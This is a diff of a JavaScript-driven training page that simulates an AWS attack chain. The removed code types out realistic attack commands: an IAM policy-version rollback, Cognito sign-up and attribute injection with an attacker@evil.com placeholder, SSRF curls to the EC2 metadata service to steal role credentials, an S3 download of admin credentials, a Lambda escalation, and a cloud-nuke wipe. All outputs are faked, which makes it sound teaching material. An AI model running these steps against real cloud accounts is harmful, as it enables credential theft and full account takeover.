-    addLine('terminal-verify', '', 'output');
-    addLine('terminal-verify', syntaxJSON({ UserId: 'AIDAIOSFODNN7EXAMPLE', Account: '012345678901', Arn: 'arn:aws:iam::012345678901:user/iamadmin' }), 'output');
-    addLine('terminal-verify', '', 'output');
-    addLine('terminal-verify', 'Identity confirmed — environment ready', 'success');
-    $('verify-success').classList.add('visible');
-    $('btn-start-recon').disabled = false;
-    toast('Identity verified!', 'success');
-  }, 'aws sts get-caller-identity');
-}
+// 11
+async function initKC(){$$('#kc .kcp').forEach(p=>p.classList.remove('vis'));const ps=$$('#kc .kcp');for(let i=0;i<ps.length;i++){await dly(500);ps[i].classList.add('vis')}}
 
-function useVerifyHint() {
-  const inputs = $$('#terminal-verify .terminal-prompt-input:not(:disabled)');
-  if (inputs.length) { inputs[inputs.length - 1].value = 'aws sts get-caller-identity'; inputs[inputs.length - 1].focus(); }
-}
-
-// =================== SCREEN 3: RECON INTERACTIVE ===================
-function initRecon() {
-  $('terminal-recon').innerHTML = '';
-  S.reconStep = 0;
-  $$('#recon-findings .finding-card').forEach(c => c.classList.remove('visible'));
-  $('btn-launch-attack').disabled = true;
-  promptNextRecon();
-}
-
-function promptNextRecon() {
-  if (S.reconStep >= S.reconCommands.length) {
-    $('recon-hint').style.display = 'none';
-    $('btn-launch-attack').disabled = false;
-    toast('Reconnaissance complete — critical finding!', 'error');
-    return;
-  }
-  const r = S.reconCommands[S.reconStep];
-  $('recon-hint-cmd').textContent = r.hint;
-  addPromptInput('terminal-recon', '$ ', r.hint, async (val) => {
-    await executeReconStep(S.reconStep);
-    S.reconStep++;
-    promptNextRecon();
-  }, r.cmd);
-}
-
-function useReconHint() {
-  const inputs = $$('#terminal-recon .terminal-prompt-input:not(:disabled)');
-  if (inputs.length) {
-    const r = S.reconCommands[S.reconStep];
-    inputs[inputs.length - 1].value = r?.cmd || '';
-    inputs[inputs.length - 1].focus();
-  }
-}
-
-async function executeReconStep(step) {
-  const t = 'terminal-recon';
-  addLine(t, '', 'output');
-  if (step === 0) {
-    await delay(600);
-    addLine(t, syntaxJSON({ UserId: 'AIDARAYNOR7EXAMPLE', Account: '012345678901', Arn: 'arn:aws:iam::012345678901:user/raynor-iam_privesc_by_rollback' }), 'output');
-    $('finding-1').classList.add('visible');
-    toast('User identity confirmed', 'info');
-  } else if (step === 1) {
-    await delay(800);
-    addLine(t, syntaxJSON({ AttachedPolicies: [{ PolicyName: 'cg-raynor-policy', PolicyArn: 'arn:aws:iam::012345678901:policy/cg-raynor-policy' }] }), 'output');
-    $('finding-2').classList.add('visible');
-    toast('1 managed policy found', 'info');
-  } else if (step === 2) {
-    await delay(800);
-    addLine(t, syntaxJSON({ Versions: [ { VersionId: 'v5', IsDefaultVersion: true }, { VersionId: 'v4', IsDefaultVersion: false }, { VersionId: 'v3', IsDefaultVersion: false }, { VersionId: 'v2', IsDefaultVersion: false }, { VersionId: 'v1', IsDefaultVersion: false } ] }), 'output');
-    $('finding-3').classList.add('visible');
-    toast('5 policy versions discovered!', 'warning');
-  } else if (step === 3) {
-    await delay(1000);
-    addLine(t, syntaxJSON({ PolicyVersion: { Document: { Version: '2012-10-17', Statement: [{ Effect: 'Allow', Action: '*', Resource: '*' }] }, VersionId: 'v1', IsDefaultVersion: false } }), 'output');
-    addLine(t, '', 'output');
-    addLine(t, 'CRITICAL: v1 grants full AdministratorAccess — Action:* Resource:*', 'alert');
-    $('finding-4').classList.add('visible');
-  }
-  addLine(t, '', 'output');
-}
-
-// =================== SCREEN 4: ESCALATION ===================
-function initEscalation() {
-  $('escalation-banner').classList.remove('visible');
-  $('escalate-confirm').classList.remove('visible');
-  $('btn-to-cognito').disabled = true;
-  $('terminal-escalate').innerHTML = '';
-  S.selectedVersion = null;
-  $$('#version-selector-card .option-card').forEach(c => c.classList.remove('selected'));
-  // Listen for confirm input
-  $('escalate-confirm-input').value = '';
-  $('btn-escalate-go').disabled = true;
-  $('escalate-confirm-input').oninput = function() {
-    $('btn-escalate-go').disabled = this.value.trim().toUpperCase() !== 'ESCALATE';
-  };
-}
-
-function selectVersion(el, ver) {
-  $$('#version-selector-card .option-card').forEach(c => c.classList.remove('selected'));
-  el.classList.add('selected');
-  S.selectedVersion = ver;
-  $('selected-version-label').textContent = ver;
-  if (ver === 'v1') {
-    $('escalate-confirm').classList.add('visible');
-    $('escalate-confirm-input').focus();
-  } else {
-    $('escalate-confirm').classList.remove('visible');
-    toast(`Version ${ver} is not dangerous enough`, 'warning');
-  }
-}
-
-async function executeEscalation() {
-  const t = 'terminal-escalate';
-  $('escalate-confirm-input').disabled = true;
-  $('btn-escalate-go').disabled = true;
-
-  await typeLine(t, `aws iam set-default-policy-version --policy-arn arn:aws:iam::012345678901:policy/cg-raynor-policy --version-id v1`, 'command', 12);
-  addLine(t, '', 'output');
-  await typeLine(t, 'Processing...', 'info', 30);
-  await delay(1500);
-  addLine(t, '', 'output');
-  addLine(t, 'Default policy version changed to v1', 'success');
-  addLine(t, '', 'output');
-  await typeLine(t, 'aws iam get-policy --policy-arn arn:aws:iam::012345678901:policy/cg-raynor-policy', 'command', 14);
-  await delay(800);
-  addLine(t, '', 'output');
-  addLine(t, syntaxJSON({ Policy: { PolicyName: 'cg-raynor-policy', DefaultVersionId: 'v1', AttachmentCount: 1 } }), 'output');
-  addLine(t, '', 'output');
-  addLine(t, 'PRIVILEGE ESCALATED — Full admin access via policy rollback', 'alert');
-
-  $('escalation-banner').classList.add('visible');
-  $('btn-to-cognito').disabled = false;
-  toast('Privilege escalation successful!', 'error');
-}
-
-// =================== SCREEN 5: COGNITO ===================
-function switchCognitoPhase(n) {
-  $$('#screen-5 .phase-tab').forEach((t, i) => t.classList.toggle('active', i === n - 1));
-  $$('#screen-5 .phase-content').forEach((c, i) => c.classList.toggle('active', i === n - 1));
-}
-
-async function executeCognitoSignup() {
-  const email = $('cog-email').value.trim() || 'attacker@evil.com';
-  const pass = $('cog-password').value.trim() || 'Attack3r!Pass';
-  const code = $('cog-code').value.trim() || '482916';
-  const t = 'terminal-cog1';
-  $(t).innerHTML = '';
-
-  await typeLine(t, `aws cognito-idp sign-up --client-id 4a3gbn8e0u5l7fj3ro9s2kd1qp --username ${email} --password ${pass}`, 'command', 10);
-  addLine(t, '', 'output');
-  await delay(800);
-  addLine(t, syntaxJSON({ UserConfirmed: false, UserSub: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890' }), 'output');
-  addLine(t, '', 'output');
-  await typeLine(t, `aws cognito-idp confirm-sign-up --client-id 4a3gbn8e0u5l7fj3ro9s2kd1qp --username ${email} --confirmation-code ${code}`, 'command', 10);
-  await delay(600);
-  addLine(t, '', 'output');
-  addLine(t, 'User confirmed — email validation bypassed', 'success');
-  toast('Cognito sign-up bypassed!', 'success');
-  // Auto switch to phase 2 after delay
-  await delay(1500);
-  switchCognitoPhase(2);
-}
-
-async function executeCognitoInject() {
-  const attr = $('cog-attr-name').value;
-  const val = $('cog-attr-value').value.trim() || 'admin';
-  if (!attr) { toast('Select an attribute first', 'warning'); return; }
-  const t = 'terminal-cog2';
-  $(t).innerHTML = '';
-
-  await typeLine(t, 'aws cognito-idp initiate-auth --auth-flow USER_PASSWORD_AUTH --client-id 4a3gbn8e0u5l7fj3ro9s2kd1qp --auth-parameters USERNAME=attacker@evil.com,PASSWORD=Attack3r!Pass', 'command', 8);
-  addLine(t, '', 'output');
-  await delay(800);
-  addLine(t, 'Authentication successful — tokens received', 'success');
-  addLine(t, '', 'output');
-  await typeLine(t, `aws cognito-idp update-user-attributes --access-token eyJraWQiOi... --user-attributes '[{"Name":"${attr}","Value":"${val}"}]'`, 'command', 10);
-  await delay(800);
-  addLine(t, '', 'output');
-  addLine(t, `${attr} set to "${val}" — privilege injected`, 'alert');
-
-  if (attr === 'custom:access' && val.toLowerCase() === 'admin') {
-    toast('Admin privilege injected!', 'error');
-  } else {
-    toast(`Attribute ${attr}="${val}" set`, 'warning');
-  }
-  await delay(1200);
-  switchCognitoPhase(3);
-}
-
-async function executeCognitoExtract() {
-  const t = 'terminal-cog3';
-  $(t).innerHTML = '';
-
-  await typeLine(t, 'aws cognito-identity get-id --identity-pool-id us-east-1:f4g5h6i7-j8k9-0abc-defg-h1i2j3k4l5m6 --logins "cognito-idp.us-east-1.amazonaws.com/us-east-1_AbCdEfGhI=eyJ..."', 'command', 8);
-  addLine(t, '', 'output');
-  await delay(800);
-  addLine(t, syntaxJSON({ IdentityId: 'us-east-1:a1b2c3d4-dead-beef-cafe-123456789abc' }), 'output');
-  addLine(t, '', 'output');
-  await typeLine(t, 'aws cognito-identity get-credentials-for-identity --identity-id us-east-1:a1b2c3d4-dead-beef-cafe-123456789abc --logins "cognito-idp..."', 'command', 8);
-  await delay(1200);
-  addLine(t, '', 'output');
-  addLine(t, syntaxJSON({ Credentials: { AccessKeyId: 'ASIAZ3EXAMPLE7COGNITO', SecretKey: 'wJalr+CognitoTemp/K7MDENG/bPxRfiCYEXAMPLE', SessionToken: 'IQoJb3JpZ2lu...truncated', Expiration: '2024-03-15T18:30:00Z' } }), 'output');
-  addLine(t, '', 'output');
-  addLine(t, 'Temporary AWS credentials obtained via Cognito', 'alert');
-
-  $('cog-creds-reveal').classList.add('visible');
-  $('btn-to-ssrf').disabled = false;
-  toast('AWS credentials extracted!', 'error');
-}
-
-// =================== SCREEN 6: SSRF INTERACTIVE ===================
-function initSSRF() {
-  $('terminal-ssrf').innerHTML = '';
-  S.ssrfStep = 0;
-  $$('#ssrf-chain .chain-node').forEach(n => n.classList.remove('visible'));
-  $$('#ssrf-chain .chain-arrow').forEach(a => a.classList.remove('visible'));
-  $('btn-to-lambda').disabled = true;
-  updateSSRFHint();
-  // Prefill first URL
-  $('ssrf-url-input').value = S.ssrfUrls[0].url;
-}
-
-function updateSSRFHint() {
-  const step = S.ssrfUrls[S.ssrfStep];
-  if (step) {
-    $('ssrf-step-num').textContent = S.ssrfStep + 1;
-    $('ssrf-step-desc').textContent = step.desc;
-    $('ssrf-url-input').placeholder = step.url;
-  }
-}
-
-async function executeSSRF() {
-  const t = 'terminal-ssrf';
-  const url = $('ssrf-url-input').value.trim();
-  if (!url) { toast('Enter a URL first', 'warning'); return; }
-
-  const step = S.ssrfStep;
-  // Animate chain node
-  const nodes = $$('#ssrf-chain .chain-node');
-  const arrows = $$('#ssrf-chain .chain-arrow');
-  if (nodes[step]) nodes[step].classList.add('visible');
-  if (step > 0 && arrows[step - 1]) arrows[step - 1].classList.add('visible');
-
-  if (step === 0) {
-    await typeLine(t, `curl "${url}"`, 'command', 12);
-    addLine(t, '', 'output');
-    await delay(800);
-    addLine(t, 'ami-id', 'output'); addLine(t, 'instance-id', 'output'); addLine(t, 'iam/', 'output');
-    addLine(t, '', 'output');
-    addLine(t, 'Metadata service accessible via SSRF', 'info');
-    toast('Metadata service reached!', 'info');
-  } else if (step === 1) {
-    await typeLine(t, `curl "${url}"`, 'command', 12);
-    addLine(t, '', 'output');
-    await delay(800);
-    addLine(t, 'cg-ec2-role-cloud_breach_s3_cgid', 'output');
-    addLine(t, '', 'output');
-    addLine(t, 'IAM role name discovered', 'info');
-    toast('IAM role discovered!', 'warning');
-  } else if (step === 2) {
-    await typeLine(t, `curl "${url}"`, 'command', 12);
-    addLine(t, '', 'output');
-    await delay(1200);
-    addLine(t, syntaxJSON({ Code: 'Success', AccessKeyId: 'ASIAZ3EXAMPLESSRF01', SecretAccessKey: 'wJalr+SSRFstolen/K7MDENG/bPxRfi', Token: 'IQoJb3JpZ2lu...truncated', Expiration: '2024-03-15T22:00:00Z' }), 'output');
-    addLine(t, '', 'output');
-    addLine(t, 'IAM role credentials stolen via SSRF', 'alert');
-    if (arrows[step]) arrows[step].classList.add('visible');
-    toast('Credentials stolen!', 'error');
-  } else if (step === 3) {
-    await typeLine(t, url, 'command', 15);
-    addLine(t, '', 'output');
-    await delay(1000);
-    addLine(t, '2024-03-15 09:12:01 cg-secret-s3-bucket-cgid', 'output');
-    addLine(t, '', 'output');
-    await typeLine(t, 'aws s3 cp s3://cg-secret-s3-bucket-cgid/admin-credentials.txt ./ --profile stolen', 'command', 12);
-    await delay(800);
-    addLine(t, 'download: s3://cg-secret-s3-bucket-cgid/admin-credentials.txt → ./admin-credentials.txt', 'output');
-    addLine(t, '', 'output');
-    addLine(t, 'Admin credentials exfiltrated from S3', 'success');
-    if (nodes[4]) nodes[4].classList.add('visible');
-    if (arrows[3]) arrows[3].classList.add('visible');
-    $('btn-to-lambda').disabled = false;
-    toast('Admin credentials downloaded!', 'error');
-  }
-  addLine(t, '', 'output');
-
-  S.ssrfStep++;
-  if (S.ssrfStep < S.ssrfUrls.length) {
-    $('ssrf-url-input').value = S.ssrfUrls[S.ssrfStep].url;
-    updateSSRFHint();
-  } else {
-    $('ssrf-input-card').style.opacity = '0.5';
-    $('ssrf-input-card').style.pointerEvents = 'none';
-    $('ssrf-step-desc').textContent = 'Chain complete!';
-  }
-}
-
-// =================== SCREEN 7: LAMBDA ===================
-function selectLambdaRole(el, role) {
-  $$('#screen-7 .option-card').forEach(c => c.classList.remove('selected'));
-  el.classList.add('selected');
-  S.selectedLambdaRole = role;
-  $('btn-deploy-lambda').disabled = false;
-  if (role === 'cg-debug') {
-    toast('cg-debug has AdministratorAccess — perfect target', 'warning');
-  }
-}
-
-async function deployLambda() {
-  const t = 'terminal-lambda';
-  $(t).innerHTML = '';
-  $('lambda-banner').classList.remove('visible');
-  $('btn-deploy-lambda').disabled = true;
-  $('btn-to-killchain').disabled = true;
-
-  await typeLine(t, 'aws sts assume-role --role-arn arn:aws:iam::012345678901:role/cg-lambdaManager-role --role-session-name lambdaManager', 'command', 10);
-  addLine(t, '', 'output');
-  await delay(800);
-  addLine(t, 'Assumed cg-lambdaManager role', 'success');
-  addLine(t, '', 'output');
-
-  await typeLine(t, 'zip lambda_escalate.zip lambda_escalate.py', 'command', 18);
-  await delay(400);
-  addLine(t, '  adding: lambda_escalate.py (stored 0%)', 'output');
-  addLine(t, '', 'output');
-
-  await typeLine(t, `aws lambda create-function --function-name escalate_privs --runtime python3.9 --role arn:aws:iam::012345678901:role/${S.selectedLambdaRole || 'cg-debug'}-role --handler lambda_escalate.lambda_handler --zip-file fileb://lambda_escalate.zip`, 'command', 8);
-  addLine(t, '', 'output');
-  await delay(1200);
-  addLine(t, `Lambda function created with ${S.selectedLambdaRole} role`, 'info');
-  addLine(t, '', 'output');
-
-  // Confirmation prompt
-  showModal('Confirm Lambda Invocation', `
-    <p class="text-muted fs-14 mb-20">You are about to invoke <code>escalate_privs</code> which will attach <strong class="text-red">AdministratorAccess</strong> to user chris.</p>
-    <p class="text-muted fs-14">This action cannot be undone. Proceed?</p>
-  `, `
-    <button class="btn btn-ghost" onclick="closeModal()">Cancel</button>
-    <button class="btn btn-primary" onclick="closeModal();invokeLambda()">Invoke Function →</button>
-  `);
-}
-
-async function invokeLambda() {
-  const t = 'terminal-lambda';
-  await typeLine(t, 'aws lambda invoke --function-name escalate_privs /tmp/out.txt', 'command', 14);
-  addLine(t, '', 'output');
-  await delay(1500);
-  addLine(t, syntaxJSON({ StatusCode: 200, ExecutedVersion: '$LATEST' }), 'output');
-  addLine(t, '', 'output');
-
-  await typeLine(t, 'aws iam list-attached-user-policies --user-name chris-lambda_privesc_cgid', 'command', 12);
-  await delay(800);
-  addLine(t, '', 'output');
-  addLine(t, syntaxJSON({ AttachedPolicies: [ { PolicyName: 'cg-chris-policy', PolicyArn: 'arn:aws:iam::012345678901:policy/cg-chris-policy' }, { PolicyName: 'AdministratorAccess', PolicyArn: 'arn:aws:iam::aws:policy/AdministratorAccess' } ] }), 'output');
-  addLine(t, '', 'output');
-  addLine(t, 'AdministratorAccess attached — full account takeover', 'alert');
-
-  $('lambda-banner').classList.add('visible');
-  $('btn-to-killchain').disabled = false;
-  toast('Full account takeover achieved!', 'error');
-}
-
-// =================== SCREEN 8: KILL CHAIN ===================
-async function initKillChain() {
-  $$('#kill-chain .kill-phase').forEach(p => p.classList.remove('visible'));
-  const phases = $$('#kill-chain .kill-phase');
-  for (let i = 0; i < phases.length; i++) {
-    await delay(600);
-    phases[i].classList.add('visible');
-  }
-}
-
-// =================== SCREEN 9: NUKE ===================
-function initNuke() {
-  $('nuke-done-banner').classList.remove('visible');
-  $('nuke-confirm').classList.remove('visible');
-  $('terminal-nuke').innerHTML = '';
-  $('nuke-region').value = '';
-  $('nuke-confirm-input').value = '';
-  $('btn-nuke-go').disabled = true;
-  ['iam','cognito','ec2','s3','lambda'].forEach(r => {
-    $(`nuke-${r}`).style.width = '0%';
-    const s = $(`nuke-${r}-status`);
-    s.textContent = '—'; s.style.color = '';
-  });
-
-  $('nuke-region').onchange = function() {
-    if (this.value) {
-      $('nuke-confirm').classList.add('visible');
-      $('nuke-confirm-input').focus();
-    }
-  };
-  $('nuke-confirm-input').oninput = function() {
-    $('btn-nuke-go').disabled = this.value.trim().toLowerCase() !== 'nuke';
-  };
-}
-
-async function executeNuke() {
-  const region = $('nuke-region').value;
-  const t = 'terminal-nuke';
-  $('nuke-confirm-input').disabled = true;
-  $('btn-nuke-go').disabled = true;
-
-  const regionFlag = region === 'all' ? '' : ` --region ${region}`;
-  await typeLine(t, `cloud-nuke aws${regionFlag}`, 'command', 15);
-  addLine(t, '', 'output');
-  await typeLine(t, 'Scanning 119 resource types...', 'info', 20);
-  await delay(1200);
-  addLine(t, '', 'output');
-  addLine(t, 'Found 14 resources to delete:', 'output');
-  addLine(t, '  IAM Users/Roles ............ 4', 'output');
-  addLine(t, '  Cognito User Pools ......... 1', 'output');
-  addLine(t, '  EC2 Instances .............. 3', 'output');
-  addLine(t, '  S3 Buckets ................. 2', 'output');
-  addLine(t, '  Lambda Functions ........... 4', 'output');
-  addLine(t, '', 'output');
-  addLine(t, 'Deleting resources...', 'alert');
-
-  const resources = ['iam','cognito','ec2','s3','lambda'];
-  const delays = [1800,1200,2000,1000,800];
-  for (let i = 0; i < resources.length; i++) {
-    const bar = $(`nuke-${resources[i]}`);
-    const status = $(`nuke-${resources[i]}-status`);
-    status.textContent = '⏳';
-    await delay(300);
-    bar.style.width = '100%';
-    await delay(delays[i]);
-    status.textContent = '✓';
-    status.style.color = 'var(--accent-green)';
-    addLine(t, `  ${resources[i].toUpperCase()} resources deleted`, 'success');
-  }
-  addLine(t, '', 'output');
-  addLine(t, 'All resources destroyed', 'success');
-  await delay(400);
-  $('nuke-done-banner').classList.add('visible');
-  toast('Environment clean!', 'success');
-}
-
-// =================== INIT ===================
-buildProgress();
-navigateTo(1);
+// ═══ BOOT ═══
+buildSB();
+buildScreens();
+nav('1');
 </script>
 </body>
 </html>
